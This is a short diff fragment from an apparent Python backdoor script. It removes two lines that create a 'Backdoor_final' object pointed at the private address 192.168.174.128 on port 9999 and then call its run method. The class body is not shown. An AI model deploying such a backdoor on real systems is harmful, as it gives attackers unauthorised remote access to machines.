@@ -135,6 +135,5 @@ class Backdoor_final:
         
             
 
-backdoor = Backdoor_final("192.168.174.128",9999)
-backdoor.run()
+
         
